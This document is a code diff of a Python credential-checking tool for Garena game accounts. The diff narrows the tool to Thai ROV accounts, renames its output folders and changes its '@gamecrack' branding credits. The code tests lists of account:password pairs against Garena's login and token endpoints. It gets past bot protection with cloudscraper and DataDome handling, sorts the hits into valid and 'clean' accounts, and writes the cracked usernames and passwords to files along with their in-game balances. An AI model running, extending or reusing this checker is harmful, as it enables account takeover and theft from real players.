@@ -1,100 +1,4 @@
 import os
-import platform
-import subprocess
-import sys
-import requests
-import hashlib
-import json
-
-# ---------------------------
-# ฟังก์ชันดึง HWID จาก Termux
-# ---------------------------
-def get_hwid():
-    try:
-        hwid = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
-        if hwid:
-            return hwid
-    except:
-        pass
-    return hashlib.sha256(platform.node().encode()).hexdigest()
-
-# ---------------------------
-# KeyAuth API Class
-# ---------------------------
-class KeyAuth:
-    def __init__(self, name, ownerid, version):
-        self.name = name
-        self.ownerid = ownerid
-        self.version = version
-        self.sessionid = None
-
-    def init(self):
-        payload = {
-            "type": "init",
-            "name": self.name,
-            "ownerid": self.ownerid,
-            "ver": self.version
-        }
-
-        r = requests.post("https://keyauth.win/api/1.2/", data=payload)
-
-        if r.status_code != 200:
-            print("❌ ไม่สามารถเชื่อม KeyAuth ได้")
-            sys.exit()
-
-        data = r.json()
-        if not data["success"]:
-            print("❌ init error:", data["message"])
-            sys.exit()
-
-        self.sessionid = data["sessionid"]
-
-    def login(self, user, password, hwid):
-        payload = {
-            "type": "login",
-            "username": user,
-            "pass": password,
-            "hwid": hwid,
-            "sessionid": self.sessionid,
-            "name": self.name,
-            "ownerid": self.ownerid,
-        }
-
-        r = requests.post("https://keyauth.win/api/1.2/", data=payload)
-        return r.json()
-
-# ---------------------------
-# เริ่มการเชื่อมต่อ KeyAuth
-# ---------------------------
-keyauthapp = KeyAuth(
-    name="luxurypm",       # ชื่อแอปใน KeyAuth
-    ownerid="vRR5SOSVs3",    # Owner ID
-    version="1.0"            # เวอร์ชัน
-)
-
-print("========== KEYAUTH LOGIN ==========")
-
-username = input("กรอก Username: ")
-password = input("กรอก Password: ")
-
-hwid = get_hwid()
-
-keyauthapp.init()
-res = keyauthapp.login(username, password, hwid)
-
-if res["success"]:
-    print("✅ ล็อกอินสำเร็จ!")
-else:
-    print("❌ ล็อกอินไม่สำเร็จ:", res["message"])
-    sys.exit()
-
-print("\n=== โปรแกรมหลักของคุณกำลังเริ่มทำงาน ===\n")
-
-# ----------------------------------------
-#   <<< วางโค้ดหลักของคุณตรงนี้ >>>
-# ----------------------------------------
-
-import os
 import sys
 import time
 import random
@@ -104,12 +8,14 @@ import logging
 import urllib.parse
 import signal
 from datetime import datetime
+from time import sleep
 from concurrent.futures import ThreadPoolExecutor
 from threading import Lock
 from Crypto.Cipher import AES
 import requests
 import cloudscraper
 import colorama
+import platform
 import threading
 from colorama import Fore, Style, Back
 from rich.console import Console
@@ -126,13 +32,8 @@ colorama.init(autoreset=True)
 console = Console()
 
 CODM_REGIONS = {
-    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
-    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
-    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
-    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
-    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
+    
     'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
-    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
 }
 
 class Colors:
@@ -386,19 +287,15 @@ class LiveStats:
         self.clean_count = 0
         self.not_clean_count = 0
 
-        self.has_codm_count = 0
-        self.no_codm_count = 0
-
-        # ➕ เพิ่มของ ROV
+        # ➕ เฉพาะ ROV
         self.rov_count = 0
         self.rov_clean = 0
         self.rov_not_clean = 0
 
         self.lock = threading.Lock()
 
-    def update_stats(self, valid=False, clean=False, has_codm=False, has_rov=False, rov_clean=False):
+    def update_stats(self, valid=False, clean=False, has_rov=False, rov_clean=False):
         with self.lock:
-
             # VALID / INVALID
             if valid:
                 self.valid_count += 1
@@ -410,13 +307,6 @@ class LiveStats:
                 self.clean_count += 1
             else:
                 self.not_clean_count += 1
-
-            # CODM
-            if has_codm:
-                self.has_codm_count += 1
-            else:
-                if valid:
-                    self.no_codm_count += 1
 
             # ROV
             if has_rov:
@@ -433,8 +323,6 @@ class LiveStats:
                 'invalid': self.invalid_count,
                 'clean': self.clean_count,
                 'not_clean': self.not_clean_count,
-                'has_codm': self.has_codm_count,
-                'no_codm': self.no_codm_count,
                 'rov_count': self.rov_count,
                 'rov_clean': self.rov_clean,
                 'rov_not_clean': self.rov_not_clean
@@ -451,8 +339,7 @@ class LiveStats:
             f"INVALID [{stats['invalid']}] | "
             f"ROV [{stats['rov_count']}] | "
             f"ROV CLEAN [{stats['rov_clean']}] | "
-            f"ROV NOT CLEAN [{stats['rov_not_clean']}] | "
-            f"CODM [{stats['has_codm']}]"
+            f"ROV NOT CLEAN [{stats['rov_not_clean']}]"
             f"{reset_color}"
         )
 
@@ -969,49 +856,13 @@ def check_codm_account(session, account):
 
 def get_game_connections(session, account):
     game_info = []
-    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
+    valid_regions = {'th'}
     
     game_mappings = {
-        'tw': {
-            "100082": "CODM",
-            "100067": "FREE FIRE",
-            "100070": "SPEED DRIFTERS",
-            "100130": "BLACK CLOVER M",
-            "100105": "GARENA UNDAWN",
-            "100050": "ROV",
-            "100151": "DELTA FORCE",
-            "100147": "FAST THRILL",
-            "100107": "MOONLIGHT BLADE"
-        },
-        'th': {
-            "100067": "FREEFIRE",
-            "100055": "ROV",
-            "100082": "CODM",
-            "100151": "DELTA FORCE",
-            "100105": "GARENA UNDAWN",
-            "100130": "BLACK CLOVER M",
-            "100070": "SPEED DRIFTERS",
-            "32836": "FC ONLINE",
-            "100071": "FC ONLINE M",
-            "100124": "MOONLIGHT BLADE"
-        },
-        'vn': {
-            "32837": "FC ONLINE",
-            "100072": "FC ONLINE M",
-            "100054": "ROV",
-            "100137": "THE WORLD OF WAR"
-        },
-        'default': {
-            "100082": "CODM",
-            "100067": "FREEFIRE",
-            "100151": "DELTA FORCE",
-            "100105": "GARENA UNDAWN",
-            "100057": "AOV",
-            "100070": "SPEED DRIFTERS",
-            "100130": "BLACK CLOVER M",
-            "100055": "ROV"
-        }
+    'th': {
+        "100055": "ROV"   # เฉพาะประเทศไทย และเฉพาะ ROV
     }
+ }
 
     try:
         token_url = "https://authgop.garena.com/oauth/token/grant"
@@ -1272,7 +1123,7 @@ def format_account_output(result):
         output_str += f"    Username: {fb_username_display}\n"
         output_str += f"    Profile: {fb_link_display}\n"
         
-        output_str += "\n╰┈➤ POWERED BY – @gamecrack\n"
+        output_str += "\n╰┈➤ POWERED BY – @Gamecrack Zeel\n"
                
     elif result["status"] == "failed":
         output_str += "-------------------------------------------------\n\n"
@@ -1284,14 +1135,14 @@ def format_account_output(result):
             output_str += f"✒ Reason: ACCOUNT DOESN'T EXIST!\n"
         else:
             output_str += f"✒ Message: {result['message']}\n"
-        output_str += "\n╰┈➤ POWERED BY – @gamecrack\n"
+        output_str += "\n╰┈➤ POWERED BY – @Gamecrack Zeel\n"
 
     elif result["status"] == "captcha":
         output_str += "-------------------------------------------------\n\n"
         output_str += "[⚠️] CAPTCHA Triggered\n"
         output_str += f"✒ Account: {result['username']}:{result['password']}\n"
         output_str += f"✒ Message: {result['message']}\n"
-        output_str += "\n╰┈➤ POWERED BY – @gamecrack\n"
+        output_str += "\n╰┈➤ POWERED BY – @Gamecrack Zeel\n"
         
     elif result["status"] == "error":
         output_str += "-------------------------------------------------\n\n"
@@ -1299,7 +1150,7 @@ def format_account_output(result):
         output_str += f"✒ Account: {result['username']}:{result['password']}\n"
         output_str += f"✒ Error Type: {result['type']}\n"
         output_str += f"✒ Message: {result['message']}\n"
-        output_str += "\n╰┈➤ POWERED BY – @gamecrack\n"
+        output_str += "\n╰┈➤ POWERED BY – @Gamecrack Zeel\n"
             
     output_str += f"\n{'-'*80}\n"
     return output_str
@@ -1349,8 +1200,8 @@ def save_codm_account(account, password, codm_info, country='N/A'):
             level_range = "351-400"
 
         
-        os.makedirs('Results', exist_ok=True)
-        level_file = os.path.join('Results', f"{country_code}_{level_range}_accounts.txt")
+        os.makedirs('เก็บรหัส', exist_ok=True)
+        level_file = os.path.join('เก็บรหัส', f"{country_code}_{level_range}_accounts.txt")
         
         
         account_exists = False
@@ -1398,7 +1249,7 @@ def save_account_details(account, details, codm_info=None, password=None, game_c
             logger.info(f"[INFO] Skipping save for {account} - No CODM account")
             return
 
-        os.makedirs('Results', exist_ok=True)
+        os.makedirs('เก็บรหัส', exist_ok=True)
 
         # --- ดึงข้อมูลเดิม ---
         email = details.get('email', 'N/A')
@@ -1528,7 +1379,7 @@ def save_account_details(account, details, codm_info=None, password=None, game_c
             f.write(f"    Username: {fb_username_display}\n")
             f.write(f"    Profile: {fb_link_display}\n")
 
-            f.write("\n╰┈➤ CHECKER BY – @gamecrackShop\n")
+            f.write("\n╰┈➤ CHECKER BY – @Gamecrack Zeel\n")
             f.write("\n" + "-" * 80 + "\n\n")
 
         # --- Save to individual lists ---
@@ -1894,12 +1745,16 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     save_path = f"{region_folder}/{clean_folder}.txt"
 
                     line = (
-                        f"{account}:{password} | "
-                        f"ชื่อตัวละคร : {character_name} | "
-                        f"{status_text} | "
-                        f"Region: {region_code} | "
-                        f"Garena Shell: {details['profile']['shell_balance']}\n"
-                    )
+    "____________________________\n"
+    f"{account}:{password} | "
+    f"ชื่อตัวละคร : {character_name} | "
+    f"{status_text} | "
+    f"Region: {region_code} | "
+    f"Garena Shell: {details['profile']['shell_balance']}\n"
+    "____________________________\n\n"
+)
+
+
 
                     with open(save_path, "a", encoding="utf-8") as f:
                         f.write(line)
